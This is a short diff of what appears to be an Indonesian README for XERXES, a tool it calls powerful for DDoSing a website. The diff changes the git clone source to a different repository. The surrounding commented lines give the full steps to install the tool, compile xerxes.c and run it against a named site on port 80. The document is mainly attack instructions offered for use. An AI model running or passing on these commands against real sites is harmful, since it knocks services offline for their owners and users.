@@ -18,7 +18,7 @@ XERXES DoS tool Yang Kuat untuk menDDOS suatu Website
 # $ pkg install mechanize
 # $ pkg install openssh
 # $ pkg install git
-# $ git clone https://github.com/TheSploit/Xerxes
+# $ git clone https://github.com/Kelas-Hackers/Xerxes
 # $ cd Xerxes
 # $ gcc xerxes.c -o xerxes
 # $ ./xerxes namaweb.com 80
